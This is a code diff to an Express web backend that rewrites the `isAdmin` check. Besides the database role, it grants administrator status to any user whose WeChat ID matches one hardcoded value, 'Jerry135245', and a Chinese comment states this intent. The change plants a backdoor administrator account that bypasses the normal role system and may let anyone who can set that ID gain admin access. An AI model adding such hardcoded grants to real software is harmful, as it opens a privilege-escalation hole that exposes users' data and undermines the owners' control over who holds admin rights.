@@ -188,7 +188,8 @@ app.delete("/api/user/account", async (req, res) => {
 // 检查是否为管理员的中间件辅助函数
 async function isAdmin(openid) {
   const user = await User.findOne({ where: { openid } });
-  return user && user.role === 'admin';
+  // 如果数据库里有手动改的 role 为 admin，或者是微信号为 Jerry135245 的，都认为是管理员
+  return user && (user.role === 'admin' || user.wechatId === 'Jerry135245');
 }
 
 // 搜索用户 (管理员用)
